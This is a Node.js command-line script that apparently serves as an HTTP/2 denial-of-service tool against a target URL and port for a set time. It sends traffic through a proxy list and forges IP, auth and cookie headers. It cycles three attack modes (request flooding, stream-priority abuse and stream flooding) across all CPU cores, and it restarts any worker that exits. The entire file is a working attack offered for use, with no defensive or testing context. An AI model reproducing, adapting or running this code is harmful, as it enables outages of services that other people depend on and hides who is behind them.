const fs = require('fs');
const http2 = require('http2');
const { cpus } = require('os');
const cluster = require('cluster');
const net = require('net');

if (process.argv.length !== 5) {
    console.log("Usage : node h2.js <url> <port> <time>");
    process.exit(1);
}

const target = process.argv[2];
const port = parseInt(process.argv[3]);
const duration = parseInt(process.argv[4]) * 1000;

if (!fs.existsSync('proxy.txt') || !fs.existsSync('ua.txt')) {
    console.log("Required files 'proxy.txt' and 'ua.txt' not found.");
    process.exit(1);
}

const proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(Boolean);
const userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(Boolean);
const endTime = Date.now() + duration;

function getRandomElement(array) {
    return array[Math.floor(Math.random() * array.length)];
}

function createHeaders() {
    return {
        ':method': Math.random() > 0.5 ? 'GET' : 'POST',
        ':path': Math.random() > 0.5 ? '/' : `/random${Math.random() * 10000}`,
        'user-agent': getRandomElement(userAgents),
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'connection': 'keep-alive',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'x-forwarded-for': `${Math.random() * 255 | 0}.${Math.random() * 255 | 0}.${Math.random() * 255 | 0}.${Math.random() * 255 | 0}`,
        'authorization': Math.random() > 0.5 ? `Bearer ${Math.random().toString(36).substring(2)}` : undefined,
        'cookie': `session=${Math.random().toString(36).substring(2)}; token=${Math.random().toString(36).substring(2)}`,
    };
}

function flood(proxy) {
    const [proxyHost, proxyPort] = proxy.split(':');
    const client = http2.connect(`https://${target}:${port}`, {
        createConnection: () => {
            return net.connect({
                host: proxyHost,
                port: parseInt(proxyPort),
            });
        },
        rejectUnauthorized: false,
        settings: {
            enablePush: false,
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxFrameSize: 16777215,
            maxHeaderListSize: 65536,
        },
    });

    client.on('error', () => client.destroy());

    function sendRequest() {
        const headers = createHeaders();
        const request = client.request(headers);

        request.on('response', () => {
            for (let i = 0; i < 100; i++) {
                const stream = client.request(headers);
                stream.on('error', () => stream.close());
                stream.end();
            }
        });

        request.on('error', () => request.close());
        request.end();
    }

    const interval = setInterval(() => {
        if (Date.now() > endTime) {
            clearInterval(interval);
            client.close();
        } else {
            sendRequest();
        }
    }, 1);
}

function prioritizationAbuse(proxy) {
    const [proxyHost, proxyPort] = proxy.split(':');
    const client = http2.connect(`https://${target}:${port}`, {
        createConnection: () => {
            return net.connect({
                host: proxyHost,
                port: parseInt(proxyPort),
            });
        },
        rejectUnauthorized: false,
    });

    client.on('error', () => client.destroy());

    const headers = createHeaders();
    const stream = client.request(headers);

    stream.on('error', () => stream.close());
    stream.end();

    for (let i = 0; i < 1000; i++) {
        const priorityStream = client.request(headers, { priority: { weight: Math.random() * 256 | 0 } });
        priorityStream.on('error', () => priorityStream.close());
        priorityStream.end();
    }

    setTimeout(() => client.close(), duration);
}

function streamFlooding(proxy) {
    const [proxyHost, proxyPort] = proxy.split(':');
    const client = http2.connect(`https://${target}:${port}`, {
        createConnection: () => {
            return net.connect({
                host: proxyHost,
                port: parseInt(proxyPort),
            });
        },
        rejectUnauthorized: false,
    });

    client.on('error', () => client.destroy());

    const headers = createHeaders();
    const request = client.request(headers);

    request.on('response', () => {
        for (let i = 0; i < 1000; i++) {
            const floodStream = client.request(headers);
            floodStream.on('error', () => floodStream.close());
            floodStream.end();
        }
    });

    setTimeout(() => client.close(), duration);
}

if (cluster.isMaster) {
    const cpuCount = cpus().length;
    for (let i = 0; i < cpuCount; i++) {
        cluster.fork();
    }

    cluster.on('exit', () => cluster.fork());
} else {
    const proxy = getRandomElement(proxies);

    const methods = [flood, prioritizationAbuse, streamFlooding];
    const selectedMethod = methods[Math.floor(Math.random() * methods.length)];

    selectedMethod(proxy);
}